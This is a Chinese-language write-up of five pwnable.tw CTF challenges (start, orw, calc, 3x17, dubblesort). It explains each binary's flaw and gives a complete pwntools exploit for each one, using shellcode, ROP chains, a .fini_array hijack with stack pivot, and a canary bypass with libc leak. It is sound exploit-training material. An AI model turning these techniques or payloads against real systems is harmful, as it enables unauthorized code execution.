# pwnable.tw writeup

#### Start

**checksec**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603331.png)

没开任何保护

**file**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603800.png)

32位静态链接

**分析**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603910.png)

很简单的程序，只有`_start`和`_exit`函数

```
08048060 <_start>:
 8048060:       54                      push   %esp
 8048061:       68 9d 80 04 08          push   $0x804809d   ; _exit函数的地址
 8048066:       31 c0                   xor    %eax,%eax    ; 寄存器清零
 8048068:       31 db                   xor    %ebx,%ebx
 804806a:       31 c9                   xor    %ecx,%ecx
 804806c:       31 d2                   xor    %edx,%edx
 804806e:       68 43 54 46 3a          push   $0x3a465443  ; 'CTF:'
 8048073:       68 74 68 65 20          push   $0x20656874  ; 'the '
 8048078:       68 61 72 74 20          push   $0x20747261  ; 'art '
 804807d:       68 73 20 73 74          push   $0x74732073  ; 's st'
 8048082:       68 4c 65 74 27          push   $0x2774654c  ; "Let'"
 8048087:       89 e1                   mov    %esp,%ecx
 8048089:       b2 14                   mov    $0x14,%dl
 804808b:       b3 01                   mov    $0x1,%bl
 804808d:       b0 04                   mov    $0x4,%al
 804808f:       cd 80                   int    $0x80        ; write(1,str,0x14)
 8048091:       31 db                   xor    %ebx,%ebx    ; 清零
 8048093:       b2 3c                   mov    $0x3c,%dl
 8048095:       b0 03                   mov    $0x3,%al
 8048097:       cd 80                   int    $0x80        ; read(0,str,0x3c)
 8048099:       83 c4 14                add    $0x14,%esp   ; 抬高栈顶返回到exit
 804809c:       c3                      ret
```

这段汇编的意思就是：向屏幕上打印“Let's start the CTF:”，然后读入屏幕输入

汇编级别的系统调用可以在这里查到

[Chromium OS Docs - Linux System Call Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32\_bit)

可以看到`read`读入了`0x3c`个字节的数据，很明显的栈溢出，用`read`覆盖掉`_exit`的地址，将`_exit`的地址改成`write`的地址从而将栈的地址泄露出来，泄露出来之后就可以在返回的地址写上shellcode获得shell了

可以手算输入的地址和`ebp`的距离，也可以直接用pwndbg的工具

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603905.png)

得到距离为20字节

exp:

```python
from pwn import *
context.log_level = 'debug'

IF_LOCAL = False

elf = ELF("./start")

if IF_LOCAL == True:
    p = process("./start")
else:
    p = remote("chall.pwnable.tw", 10000)

def dbg():
    gdb.attach(p)

payload = b'A' * 20 + p32(0x08048087)

p.recv()
p.send(payload)

esp_addr = u32(p.recv()[:4])
log.success("esp_addr => {}".format(hex(esp_addr)))

shellcode = b"\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80"
payload = b'A' * 20 + p32(esp_addr + 0x14) + shellcode

p.sendline(payload)

p.interactive()
```

#### orw

**checksec**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603024.png)

有Canary保护，got表可写

**file**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603059.png)

32位动态链接

**分析**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603868.png)

程序直接执行输入的shellcode，但是只允许执行`open`、`write`、`read`三个系统调用，因为已经知道服务器上的flag存在`/home/[problem_name]/flag`中，可以直接打开文件，将文件的内容读到栈中再打印到屏幕上

exp:

```python
from pwn import *
context.log_level = 'debug'

IF_LOCAL = False

elf = ELF("./orw")

if IF_LOCAL == True:
    p = process("./orw")
else:
    p = remote("chall.pwnable.tw", 10001)

def dbg():
    gdb.attach(p)

shell_code = shellcraft.open("/home/orw/flag")
shell_code += shellcraft.read("eax", "esp", 0x30)
shell_code += shellcraft.write(1, "esp", 0x30)

p.recv()
p.send(asm(shell_code))

p.interactive()
```

#### calc

**checksec**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603188.png)

got表可写，有Canary保护，栈不可执行

**file**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603296.png)

32位静态链接

**分析**

运行一下发现是个计算器，打开IDA分析一下

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603265.png)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161603213.png)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604096.png)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604789.png)

这个计算的逻辑是这样的：

> 假如输入`1+1`，`num[0] = 2, num[1] = 1, num[2] = 1`
>
> `num[*num - 1] += num[*num]` => `num[2 - 1] += num[2]` => `num[1] = num[1] + num[2] = 1 + 1 = 2`
>
> 最后`--*num`，即`num[0]--`

但如果进行错误的输入，可以导致任意地址写

> 本题的泄漏点就在`*num`这里，如果我输入`+100`这种算式，计算的过程如下
>
> `num[*num - 1] += num[*num]` => `num[1 - 1] += num[1]` => `num[0] = num[0] + num[1] = 1 + 100 = 101`
>
> 最后`--*num`，即`num[0] = 100`
>
> 如果在100后面继续加入内容，比如`+100+200`，先进行第一步`+100`得到了`= num[0] = 100`，接着在`parse_expr`进入之前对`*num`进行+1的操作，现在`num[0] = 101`
>
> `num[*num - 1] += num[*num]` => `num[101 - 1] += num[1]` => `num[100] = num[100] + num[1] = 200`
>
> 于是就可以在栈上任意地址写

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604229.png)

在`calc()`函数里面看到`num`距离ebp的偏移是`0x5A0 = 1440`，加上4位返回地址就是1444位偏移量，即`num[361] = &ret`，`num[360]`即main\_ebp的地址

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604616.png)

在`main`入栈的这段可以看到

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604976.png)

所以获取main\_ebp之后就可以得到esp，`esp = ((ebp_addr + 0x100000000) & 0xFFFFFFF0) - 0x10`，加上`0x100000000`是让获取到的main\_ebp变成正的

因为栈不可执行且静态链接，所以shellcode是不能用了，构造一个ROPchain来执行`system("/bin/sh")`

```
eax = 0xb
ebx = '/bin/sh'
ecx = 0
edx = 0
int 80
```

在写入ROPchain的时候，因为做的是加法且有负数，所以需要判断一下负数，原本地址再加上目标地址和原本地址的差值就是目标地址

这里有一个问题就是需要找到`/bin/sh`字符串的位置，gdb调试得到main\_esp-main\_ebp = 24

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604680.png)

又因为main入栈前push了返回地址，main\_esp地址+4，所以main\_esp-main\_ebp = 28

因为`num[361]`存了`calc`的返回地址，`num[361] - main_ebp = 28`，那么`num[368] = main_ebp = num[360]`，所以`bin_addr = main_ebp`

exp:

```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

IF_LOCAL = True

elf = ELF("./calc")

if IF_LOCAL == True:
    p = process("./calc")
else:
    p = remote("chall.pwnable.tw", 10100)

def dbg():
    gdb.attach(p)

#leak stack address
p.recv()
p.sendline("+360")

ebp_addr = int(p.recvline())
esp_addr = ((ebp_addr + 0x100000000) & 0xFFFFFFF0) - 0x10
print("ebp_addr - esp_addr => {}".format(hex(ebp_addr - esp_addr + 0x100000000)))
log.success("ebp_addr => {}".format(hex(ebp_addr)))
log.success("esp_addr => {}".format(hex(esp_addr)))

# ROP
pop_eax_addr            = 0x0805c34b # pop eax; ret;
pop_edx_ecx_ebx_addr    = 0x080701d0 # pop edx; pop ecx; pop ebx; ret;
int_80_addr             = 0x08049a21 # int 0x80;
bin_sh_addr             = ebp_addr
str_bin                 = 0x6e69622f
str_sh                  = 0x0068732f
payload = [pop_eax_addr, 0xb, pop_edx_ecx_ebx_addr, 0, 0, bin_sh_addr, int_80_addr, str_bin, str_sh]

for i in range(len(payload)):
    
    if i == 7:
        dbg()
    
    p.sendline("+" + str(361 + i))

    num = int(p.recvline())
    diff = payload[i] - num

    if diff > 0:
        p.sendline("+" + str(361 + i) + "+" + str(diff))
    else:
        p.sendline("+" + str(361 + i) + str(diff))
        
    p.recvline()


p.interactive()
```

#### 3x17

**checksec**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604241.png)

got表可写，栈不可执行

**file**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604932.png)

64位静态链接

**分析**

直接IDA打开看一下

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604702.png)

`start`函数内有几个函数比较可疑，第一个`sub_401B6D`点开和运行时的结构比较相似，大概率是`main`函数

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604213.png)

流程很简单，就是任意地址写任意内容，但是写的长度只有`0x18`字节

这道题是劫持`final_array`从而达到循环写入的目的

具体来说，一个程序的入口位置并不是`main`函数，而是`_start`函数，而`_start`函数会启动`__libc_start_main`，`__libc_start_main`的几个参数中包括

* `__libc_csu_init`
* `main`
* `exit(__libc_csu_fini)`

csu即C start up，在实际执行过程中

* `__libc_csu_init`执行`.init`、`.init_array`
* `__libc_csu_fini`执行`.fini`、`.fini_array`

.xxxx\_array内是指向函数的指针，执行顺序如下：

* .init
* .init\_array\[0]
* .init\_array\[1]
* .init\_array\[2]
* ...
* .init\_array\[n]
* main
* .fini\_array\[n]
* ...
* .fini\_array\[2]
* .fini\_array\[1]
* .fini\_array\[0]
* .fini

可以看到`__libc_csu_fini`是逆序执行`.fini_array`的，如果将`.fini_array[0]`覆盖成`__libc_csu_fini`的地址，将`.fini_array[n]`修改成想要执行代码的地址，这样就会一直循环执行其他地址的代码，直到`.fini_array[0]`覆盖成其他的值

更加详细的程序启动过程可以看[Linux x86 Program Start Up - How the heck do we get to main()?](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)

因为这个程序没有符号，所以函数都是这样的，通过观察`start`中的函数修改出具体的函数

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161604528.png)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161605985.png)

`main`函数的流程是：当`tot=1`时任意地址写任意内容，写完后校验Canary退出。因为`tot`是`unsigned __int8`类型的，只要不断地循环直到`tot=256`再循环一次溢出，就能够让`tot=0`，从而再进行任意地址写入

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161605015.png)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161605692.png)

找到`.fini_array`的地址=>`0x4B40F0`

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161605517.png)

将`.fini_array[0]`覆盖成`__libc_csu_fini`，`.fini_array[1]`覆盖成`main`，这样就可以循环执行任意地址写了

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161605876.png)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161605275.png)

所以只要不断循环写入，布置好shellcode再跳过去执行就行了

这道题栈不可执行且静态链接所以是构造ROPchain，但是无法泄露出栈的位置，所以得用栈迁移

可以把ROPchain布置在`.fini_array[0] + 0x10`的位置，防止循环被破坏

> 栈迁移是利用`leave; ret;`指令，修改`ebp`到指定的地址，从而将`esp`修改到指定的地址并劫持`eip`
>
> `leave` = `mov esp, ebp; pop ebp`
>
> `ret` = `pop eip`
>
> 更详细的内容参考[栈迁移原理介绍与应用](https://www.cnblogs.com/max1z/p/15299000.html)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161605170.png)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161605850.png)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161605803.png)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161606596.png)

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161606426.png)

可以看到，`RIP`已经被劫持到了我们的ROPchain的地址，`/bin/sh`随便写在哪个位置都可以，64位的ROPchain构造如下

```
pop rax
0x3b
pop rdi
address of "/bin/sh\x00"
pop rsi
0
pop rdx
0
syscall
```

exp:

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch="amd64", os="linux", log_level="debug")

IF_LOCAL = True

elf = ELF("./3x17")

if IF_LOCAL == True:
    p = process("./3x17")
else:
    p = remote("chall.pwnable.tw", 10105)

main_addr = 0x401B6D
libc_csu_fini_addr = 0x402960
fini_array_addr = 0x4B40F0

# ROPgadget
pop_rax_ret_addr = 0x41E4AF
pop_rdi_ret_addr = 0x401696
bin_sh_addr      = 0x4B9407 # random address
pop_rsi_ret_addr = 0x406C30
pop_rdx_ret_addr = 0x446E35
syscall_addr      = 0x4022B4
payload = [p64(pop_rax_ret_addr), p64(0x3B), p64(pop_rdi_ret_addr), p64(bin_sh_addr), p64(pop_rsi_ret_addr), p64(0), p64(pop_rdx_ret_addr), p64(0), p64(syscall_addr)]


fake_esp = 0x4B40F0 + 0X10
leave_addr = 0x401C4B
ret_addr = 0x401016

def send_message(addr, data):
    p.sendafter("addr:", str(addr))
    p.sendafter("data:", data)

send_message(fini_array_addr, p64(libc_csu_fini_addr) + p64(main_addr))

# write ROP chain

send_message(bin_sh_addr, "/bin/sh\x00")

for i in range(len(payload)):
    offset = i * 8
    send_message(fake_esp + offset, payload[i])

# gdb.attach(p, "break *0x401C4B")

send_message(fini_array_addr, p64(leave_addr) + p64(ret_addr))

p.interactive()
```

#### dubblesort

**checksec**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161606543.png)

保护全开

**file**

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161606147.png)

32位动态链接

**分析**

> 这道题服务器上的版本和本地的环境不同，偏移量都不同，这里以本地作为writeup

这道题给出了题目的glibc环境，同样也是提示这道题可能是需要泄露出libc的基地址

先用patchelf修改软链接，查看题目的glibc的链接器版本，给`libc_32.so.6`添加可执行的权限，运行一下

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161606186.png)

可以看到是2.23版本，然后用patchelf修改路径

> `patchelf --replace-needed libc.so.6 [libc path] [program path]`修改glibc
>
> `patchelf --set-interpreter [ld path] [program path]`修改ld

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161606138.png)

验证一下可以运行，说明版本是对的

在pwntools中也给了比较方便的运行环境，这么写一下也可以

```python
p = process(["/glibc/2.23/32/lib/ld-2.23.so", "./dubblesort"], env = {"LD_PRELOAD": "./libc_32.so.6"})
```

打开IDA看一下程序的逻辑，其实就是一个简单的冒泡排序

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161606367.png)

放进gdb调一下看看能不能泄露出什么东西

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161606652.png)

能看到距离输入字符串的地方藏了libc的地址，因为动态链接的时候，虽然加载地址会变化，但是偏移量是不变的，只要把偏移量算出来就能得到libc加载的基地址，从而就可以得到`system`和`/bin/sh`的真实地址

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161606005.png)

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch="amd64", os="linux", log_level="debug")

IF_LOCAL = True

elf = ELF("./dubblesort")
libc = ELF("./libc_32.so.6")

if IF_LOCAL == True:
    # p = process(["/glibc/2.23/32/lib/ld-2.23.so", "./dubblesort"], env = {"LD_PRELOAD": "./libc_32.so.6"})
    p = process("./dubblesort")
else:
    p = remote("chall.pwnable.tw", 10101)


# gdb.attach(p)

p.sendlineafter("What your name :", b"A" * 24 + b"LEAK")
p.recvuntil(b"LEAK")

libc_base_addr = u32(p.recv(4)) - 0x1b000a

log.success("libc_base_addr => {}".format(hex(libc_base_addr)))

system_addr = libc_base_addr + libc.symbols["system"]
bin_sh_addr = libc_base_addr + next(libc.search(b"/bin/sh"))

log.success("system_addr => {}".format(hex(system_addr)))
log.success("bin_sh_addr => {}".format(hex(bin_sh_addr)))

p.interactive()
```

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161607159.png)

可以看到泄露出了真实地址，下面就是覆写栈上的地址

但这里有个问题就是，这个程序是有Canary保护的，对这个保护有几种绕过方式：爆破、格式化字符串漏洞泄露Canary、不进行修改

利用`scanf("%u")`的机制，如果读入`+`或者`-`，`scanf("%u")`会进行读入但不会修改地址的内容从而绕过Canary的校验

Canary的特点是最后两位为`00`，调试看一下和Canary的距离

![](https://cdn.jsdelivr.net/gh/AimiP02/My-imgHome/img/202209161607647.png)

算出来距离Canary有24个偏移，距离ret有7个偏移，加上自己的地址一共需要读入24 + 1 + 7 + 1 + 2 = 35个数字

exp:

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch="amd64", os="linux", log_level="debug")

IF_LOCAL = True

elf = ELF("./dubblesort")
libc = ELF("./libc_32.so.6")

if IF_LOCAL == True:
    # p = process(["/glibc/2.23/32/lib/ld-2.23.so", "./dubblesort"], env = {"LD_PRELOAD": "./libc_32.so.6"})
    p = process("./dubblesort")
else:
    p = remote("chall.pwnable.tw", 10101)


# gdb.attach(p)

p.sendlineafter("What your name :", b"A" * 24 + b"LEAK")
p.recvuntil(b"LEAK")

libc_base_addr = u32(p.recv(4)) - 0x1b000a

log.success("libc_base_addr => {}".format(hex(libc_base_addr)))

system_addr = libc_base_addr + libc.symbols["system"]
bin_sh_addr = libc_base_addr + next(libc.search(b"/bin/sh"))

log.success("system_addr => {}".format(hex(system_addr)))
log.success("bin_sh_addr => {}".format(hex(bin_sh_addr)))

p.sendline(str(35))

for i in range(24):
    p.sendlineafter("number : ", str(1))

p.sendlineafter("number : ", "+")

for i in range(9):
    p.sendlineafter("number : ", str(system_addr))

p.sendlineafter("number : ", str(bin_sh_addr))

p.interactive()
```
